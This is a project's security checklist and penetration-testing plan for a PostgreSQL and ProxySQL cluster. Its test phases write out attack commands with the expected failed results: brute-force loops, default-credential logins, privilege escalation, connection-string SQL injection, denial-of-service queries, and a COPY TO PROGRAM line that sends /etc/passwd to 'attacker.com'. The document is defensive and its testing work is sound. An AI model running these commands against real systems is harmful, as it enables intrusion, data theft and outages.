# Security Checklist & Penetration Testing Guide

## ⚠️ CRITICAL: Pre-Deployment Security Review

Before deploying to Railway (public infrastructure), this cluster MUST pass all security checks.

**Last Review Date:** October 27, 2025  
**Status:** 🔴 PENDING REVIEW - DO NOT DEPLOY YET

---

## 📋 Security Checklist

### 1. Password & Secrets Management

#### ✅ Completed
- [x] No hardcoded passwords in Git repository
- [x] Auto-generated 32-char passwords (OpenSSL)
- [x] Railway environment variables (encrypted at rest)
- [x] Reference variables `${{VARIABLE_NAME}}` in .env files
- [x] No passwords in documentation (placeholders only)

#### ⚠️ TO REVIEW
- [ ] **ProxySQL admin password** - Currently defaults to `admin/admin`
- [ ] **PostgreSQL superuser access** - Verify password strength
- [ ] **Repmgr password** - Verify not exposed in logs
- [ ] **Railway environment variable permissions** - Verify only authorized users

#### 🔴 CRITICAL RISKS
- **ProxySQL admin interface exposed on port 6132**
  - Default credentials: `admin/admin`
  - Risk: Full database access if ProxySQL is publicly exposed
  - Action Required: MUST change before public deployment

---

### 2. Network Exposure & Access Control

#### ✅ Internal Railway Network (Safe)
```
pg-1.railway.internal:5432      ← Internal only (good!)
pg-2.railway.internal:5432      ← Internal only (good!)
pg-3.railway.internal:5432      ← Internal only (good!)
pg-4.railway.internal:5432      ← Internal only (good!)
witness.railway.internal:5432   ← Internal only (good!)
```

#### ⚠️ ProxySQL Public Exposure
```
proxysql.railway.app:5432       ← Will be PUBLIC after domain setup
proxysql-2.railway.app:5432     ← Will be PUBLIC after domain setup
```

**Current Risk Assessment:**

| Port | Service | Public Access | Risk Level | Mitigation |
|------|---------|---------------|------------|------------|
| 5432 | ProxySQL PostgreSQL | YES (after domain) | 🟡 MEDIUM | Require SSL + strong passwords |
| 6132 | ProxySQL Admin | SHOULD BE NO | 🔴 HIGH | MUST NOT expose publicly |
| 5432 | PostgreSQL nodes | NO (internal only) | 🟢 LOW | Keep internal only |

#### 🔴 CRITICAL ACTIONS REQUIRED

1. **NEVER expose ProxySQL admin port (6132) publicly**
   ```bash
   # In proxysql/entrypoint.sh, admin interface should be:
   pgsql_ifaces="127.0.0.1:6132"  # Localhost only ✅
   # NOT:
   pgsql_ifaces="0.0.0.0:6132"    # All interfaces ❌
   ```

2. **Verify pg_hba.conf allows only Railway internal network**
   ```bash
   # Current config (REVIEW NEEDED):
   host    all             all             0.0.0.0/0               md5
   host    all             all             ::/0                    md5
   
   # This allows connections from ANYWHERE with valid password
   # Consider restricting to Railway IP ranges after deployment
   ```

3. **Enable SSL/TLS for ProxySQL public endpoints**
   - Railway provides SSL termination at domain level
   - But enforce SSL-only connections in application

---

### 3. Authentication & Authorization

#### PostgreSQL Users & Roles

**Current Users:**
```sql
postgres    - Superuser (full access)
repmgr      - Replication user (can read all data)
```

**Risk Analysis:**
- ✅ Both require password authentication
- ⚠️ No read-only user for applications
- ⚠️ No granular permissions (all or nothing)
- 🔴 Superuser credentials in Railway env vars (accessible to all services)

**Recommendations:**
```sql
-- Create read-only user for applications
CREATE USER app_readonly WITH PASSWORD 'strong_password';
GRANT CONNECT ON DATABASE postgres TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;

-- Create read-write user for applications
CREATE USER app_readwrite WITH PASSWORD 'strong_password';
GRANT CONNECT ON DATABASE postgres TO app_readwrite;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;

-- Revoke superuser from application connections
-- Only use postgres user for admin tasks
```

---

### 4. Data Encryption

#### At Rest
- [x] Railway volumes encrypted by default (AES-256)
- [x] PostgreSQL data files on encrypted volumes
- [x] ProxySQL config on encrypted volumes

#### In Transit
- [ ] **SSL/TLS between client and ProxySQL** - NOT CONFIGURED
- [x] **Railway internal network** - Encrypted by Railway
- [ ] **SSL/TLS for replication** - NOT CONFIGURED

#### 🔴 CRITICAL GAPS

**1. No SSL/TLS for client connections**

Current state:
```
Client → ProxySQL: Unencrypted ❌
ProxySQL → PostgreSQL: Unencrypted (but internal network) 🟡
```

Required:
```
Client → ProxySQL: SSL/TLS encrypted ✅
ProxySQL → PostgreSQL: Internal network (Railway encrypted) ✅
```

**2. Replication traffic unencrypted**

Current `pg_hba.conf`:
```
host    replication     repmgr          0.0.0.0/0               md5
```

Should be:
```
hostssl replication     repmgr          0.0.0.0/0               md5
```

---

### 5. Logging & Monitoring

#### Current State
- [x] Basic logging via Railway logs
- [x] Repmgr cluster monitoring
- [x] ProxySQL connection stats
- [ ] **Security event logging** - NOT CONFIGURED
- [ ] **Failed login attempt monitoring** - NOT CONFIGURED
- [ ] **Anomaly detection** - NOT CONFIGURED

#### Required Security Logs
```sql
-- Enable PostgreSQL audit logging
ALTER SYSTEM SET log_connections = 'on';
ALTER SYSTEM SET log_disconnections = 'on';
ALTER SYSTEM SET log_statement = 'ddl';  -- Log all DDL statements
ALTER SYSTEM SET log_min_duration_statement = 1000;  -- Log slow queries (>1s)
```

#### ProxySQL Audit
```sql
-- Enable query logging for security review
UPDATE global_variables SET variable_value='1' WHERE variable_name='mysql-query_digests';
LOAD MYSQL VARIABLES TO RUNTIME;
```

---

### 6. Backup & Disaster Recovery

#### Current State
- [x] Railway daily volume snapshots
- [ ] **Off-site backups** - NOT CONFIGURED
- [ ] **Backup encryption** - UNKNOWN
- [ ] **Backup retention policy** - UNKNOWN
- [ ] **Recovery testing** - NOT TESTED

#### 🔴 CRITICAL ACTIONS

1. **Verify Railway backup encryption**
   - Railway snapshots: Are they encrypted?
   - Contact Railway support to confirm

2. **Test disaster recovery**
   ```bash
   # Simulate full cluster failure
   # Verify can restore from snapshot
   # Document RTO/RPO
   ```

3. **Implement off-site backups**
   ```bash
   # Daily backup to external storage
   pg_dump -Fc postgres | aws s3 cp - s3://backups/$(date +%Y%m%d).dump
   ```

---

### 7. Dependency Vulnerabilities

#### Container Images
```dockerfile
FROM postgres:17
FROM proxysql/proxysql:latest
```

**Risks:**
- ⚠️ ProxySQL 3.0.2 BETA - Not production-ready
- ⚠️ Using `latest` tag - Not pinned to specific version
- ⚠️ Unknown vulnerabilities in base images

**Required Actions:**
```bash
# Scan container images for vulnerabilities
docker scan postgres:17
docker scan proxysql/proxysql:3.0.2

# Pin to specific versions
FROM postgres:17.0-alpine  # More specific
FROM proxysql/proxysql:3.0.2  # Remove 'latest'
```

---

### 8. Railway Platform Security

#### Platform Limitations
- ⚠️ **No VPC/Private Network** - All services in shared Railway network
- ⚠️ **No IP allowlisting at platform level** - Must implement in app
- ⚠️ **No Web Application Firewall (WAF)** - No DDoS protection
- ✅ **SSL termination** - Railway provides Let's Encrypt certs

#### Recommendations
1. **Use Railway Pro plan** - Better isolation
2. **Enable 2FA on Railway account** - Prevent unauthorized access
3. **Limit Railway project members** - Principle of least privilege
4. **Rotate Railway API tokens** - If using CI/CD

---

## 🔍 Penetration Testing Plan

### Phase 1: Network Reconnaissance

```bash
# 1. Discover public endpoints
nmap -p 5432,6132 proxysql.railway.app
nmap -p 5432,6132 proxysql-2.railway.app

# Expected results:
# Port 5432: OPEN (PostgreSQL)
# Port 6132: CLOSED or FILTERED (ProxySQL admin)

# 2. Check for exposed admin interfaces
curl -v https://proxysql.railway.app:6132
# Should return: Connection refused or timeout

# 3. Banner grabbing
psql "postgresql://proxysql.railway.app:5432/postgres" -c "SELECT version();"
# Should return PostgreSQL version (leaks server info)
```

### Phase 2: Authentication Testing

```bash
# 1. Brute force protection testing
for i in {1..100}; do
  psql "postgresql://admin:wrong_password@proxysql.railway.app:5432/postgres" -c "SELECT 1;" 2>&1
done
# Should: Implement rate limiting or account lockout

# 2. Default credentials
psql "postgresql://postgres:postgres@proxysql.railway.app:5432/postgres"
psql "postgresql://admin:admin@proxysql.railway.app:5432/postgres"
# Should: Both fail (no default passwords)

# 3. SQL injection in connection string
psql "postgresql://postgres'; DROP TABLE users; --@proxysql.railway.app:5432/postgres"
# Should: Safely handle (no SQL injection in connection params)
```

### Phase 3: Authorization Testing

```bash
# 1. Privilege escalation
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" -c "CREATE USER hacker SUPERUSER;"
# Should: Fail (app user should not have SUPERUSER)

# 2. Data access beyond permissions
psql "postgresql://readonly:password@proxysql.railway.app:5432/postgres" -c "DELETE FROM sensitive_data;"
# Should: Fail (readonly user can't DELETE)

# 3. Cross-database access
psql "postgresql://app_user:password@proxysql.railway.app:5432/template1"
# Should: Fail (app user should only access 'postgres' database)
```

### Phase 4: Data Exfiltration

```bash
# 1. Dump entire database
pg_dump "postgresql://app_user:password@proxysql.railway.app:5432/postgres" > /tmp/dump.sql
# Should: Timeout or rate-limit for large dumps

# 2. COPY TO FILE (PostgreSQL admin command)
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "COPY (SELECT * FROM users) TO '/tmp/stolen_data.csv';"
# Should: Fail (COPY TO FILE requires superuser)

# 3. COPY TO PROGRAM (remote code execution)
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "COPY (SELECT '') TO PROGRAM 'curl attacker.com/steal?data=$(cat /etc/passwd)';"
# Should: Fail (COPY TO PROGRAM requires superuser)
```

### Phase 5: Denial of Service

```bash
# 1. Connection exhaustion
for i in {1..1000}; do
  psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" -c "SELECT pg_sleep(3600);" &
done
# Should: ProxySQL connection limit prevents exhaustion

# 2. Resource exhaustion (CPU)
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "SELECT COUNT(*) FROM generate_series(1, 999999999) a, generate_series(1, 999999999) b;"
# Should: Query timeout or statement_timeout kills query

# 3. Disk exhaustion
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "CREATE TABLE bloat AS SELECT * FROM generate_series(1, 999999999);"
# Should: Disk quota or Railway resource limits prevent

# 4. ProxySQL admin DoS (if exposed)
curl -X POST http://proxysql.railway.app:6132/admin \
  -d "LOAD MYSQL SERVERS TO RUNTIME; SAVE MYSQL SERVERS TO DISK;" \
  -H "Content-Type: application/sql" --max-time 1 &
# Repeat 1000x - should be blocked (admin interface not public)
```

### Phase 6: Configuration Vulnerabilities

```bash
# 1. Check PostgreSQL settings
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" -c "SHOW all;"
# Look for:
# - ssl = off (should be 'on')
# - log_connections = off (should be 'on')
# - log_statement = 'none' (should be 'ddl' or higher)

# 2. Check pg_hba.conf (if accessible)
psql "postgresql://postgres:password@proxysql.railway.app:5432/postgres" \
  -c "SELECT * FROM pg_hba_file_rules;"
# Should: NOT allow connections from 0.0.0.0/0 without SSL

# 3. Check for unnecessary extensions
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "SELECT * FROM pg_available_extensions WHERE installed_version IS NOT NULL;"
# Should: Only essential extensions (repmgr, etc.)
```

### Phase 7: ProxySQL-Specific Attacks

```bash
# 1. ProxySQL query poisoning
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres" \
  -c "/*+ ROUTE_TO_PRIMARY */ SELECT * FROM sensitive_data;"
# Check if ProxySQL routing hints can be manipulated

# 2. Connection pool hijacking
# Open connection, keep alive, try to access other users' sessions
psql "postgresql://app_user:password@proxysql.railway.app:5432/postgres"
# In session: SELECT pg_backend_pid(), current_user, current_database();
# Should: Each connection isolated

# 3. Admin interface access (if exposed)
psql -h proxysql.railway.app -p 6132 -U admin proxysql
# Should: Connection refused or require strong authentication
```

---

## 🛡️ Security Hardening Checklist

### Immediate Actions (Before Public Deployment)

#### 🔴 CRITICAL (MUST FIX)
- [ ] **Change ProxySQL admin password**
  ```bash
  UPDATE global_variables SET variable_value='NEW_STRONG_PASSWORD' 
  WHERE variable_name='admin-admin_credentials';
  LOAD ADMIN VARIABLES TO RUNTIME;
  SAVE ADMIN VARIABLES TO DISK;
  ```

- [ ] **Verify ProxySQL admin interface NOT publicly accessible**
  ```bash
  # In proxysql/entrypoint.sh, ensure:
  pgsql_ifaces="127.0.0.1:6132"  # NOT 0.0.0.0:6132
  ```

- [ ] **Generate and verify strong passwords**
  ```bash
  # Verify Railway environment variables
  railway variables | grep -E "POSTGRES_PASSWORD|REPMGR_PASSWORD"
  # Should be 32+ char random strings, not weak passwords
  ```

- [ ] **Review pg_hba.conf access controls**
  ```bash
  # Current: Allows from 0.0.0.0/0 (too permissive)
  # Consider: Restrict to Railway IP ranges after deployment
  ```

#### 🟡 HIGH PRIORITY (Fix within 24h of deployment)
- [ ] **Enable SSL/TLS for client connections**
- [ ] **Create application-specific database users** (not postgres superuser)
- [ ] **Enable PostgreSQL audit logging**
- [ ] **Set up monitoring and alerting** (failed logins, unusual queries)
- [ ] **Document incident response plan**

#### 🟢 MEDIUM PRIORITY (Fix within 1 week)
- [ ] **Implement query timeouts** (`statement_timeout`)
- [ ] **Set connection limits per user**
- [ ] **Regular vulnerability scanning** (weekly)
- [ ] **Backup encryption verification**
- [ ] **Disaster recovery drill**

---

## 📊 Security Metrics & Monitoring

### Key Metrics to Track

```sql
-- Failed login attempts
SELECT COUNT(*) FROM pg_stat_database 
WHERE datname = 'postgres' 
  AND blks_read > 1000000;  -- Anomaly detection

-- Active connections by user
SELECT usename, COUNT(*) 
FROM pg_stat_activity 
GROUP BY usename;

-- Long-running queries (potential DoS)
SELECT pid, now() - query_start as duration, query 
FROM pg_stat_activity 
WHERE state = 'active' 
  AND now() - query_start > interval '5 minutes';

-- Replication lag (security: data freshness)
SELECT client_addr, state, sync_state, 
       pg_wal_lsn_diff(pg_current_wal_lsn(), replay_lsn) AS lag_bytes
FROM pg_stat_replication;
```

### ProxySQL Monitoring

```sql
-- Connection pool usage
SELECT hostgroup, srv_host, status, ConnUsed, ConnFree, Latency_us
FROM stats_pgsql_connection_pool;

-- Query errors (potential attacks)
SELECT count_star, sum_time, digest_text 
FROM stats_pgsql_query_digest 
WHERE digest_text LIKE '%error%' 
ORDER BY count_star DESC 
LIMIT 10;
```

---

## 🚨 Incident Response Plan

### Security Incident Severity Levels

**P0 - Critical (Immediate Response)**
- Active data breach
- Complete cluster compromise
- Ransomware attack

**P1 - High (Response within 1 hour)**
- Unauthorized access detected
- ProxySQL admin interface exposed
- SQL injection exploit

**P2 - Medium (Response within 24 hours)**
- Brute force attempts
- Unusual query patterns
- Configuration drift

### Response Steps

1. **Detection & Verification** (5 min)
   ```bash
   # Check active connections
   railway ssh --service pg-1
   gosu postgres psql -c "SELECT * FROM pg_stat_activity;"
   
   # Check ProxySQL logs
   railway logs --service proxysql --tail 100 | grep -i "error\|unauthorized"
   ```

2. **Containment** (15 min)
   ```bash
   # Option 1: Block specific IP (ProxySQL)
   # Add to ProxySQL blocklist
   
   # Option 2: Revoke user access
   gosu postgres psql -c "REVOKE ALL ON DATABASE postgres FROM compromised_user;"
   
   # Option 3: Full lockdown (emergency)
   # Pause all Railway services except witness
   ```

3. **Investigation** (1-4 hours)
   - Review audit logs
   - Identify attack vector
   - Assess data impact
   - Preserve evidence

4. **Recovery** (varies)
   - Restore from backup if needed
   - Apply security patches
   - Rotate all credentials
   - Update firewall rules

5. **Post-Incident** (1 week)
   - Root cause analysis
   - Update security policies
   - Implement prevention measures
   - Team training

---

## ✅ Pre-Deployment Security Sign-Off

**DO NOT DEPLOY** until all critical items are addressed:

```
Security Review Checklist:
[ ] All passwords changed from defaults
[ ] ProxySQL admin interface secured (localhost only)
[ ] SSL/TLS configured for client connections
[ ] pg_hba.conf reviewed and restricted
[ ] Application users created (no superuser usage)
[ ] Audit logging enabled
[ ] Backup and recovery tested
[ ] Penetration testing completed
[ ] Incident response plan documented
[ ] Team trained on security procedures

Reviewed by: __________________
Date: __________________
Approval: [ ] APPROVED  [ ] REJECTED
```

---

## 📚 Additional Resources

- [OWASP Database Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)
- [PostgreSQL Security Best Practices](https://www.postgresql.org/docs/current/security.html)
- [ProxySQL Security Guidelines](https://proxysql.com/documentation/security/)
- [Railway Security Documentation](https://docs.railway.app/reference/security)

---

**Last Updated:** October 27, 2025  
**Next Review:** Before production deployment  
**Status:** 🔴 SECURITY REVIEW REQUIRED - DO NOT DEPLOY
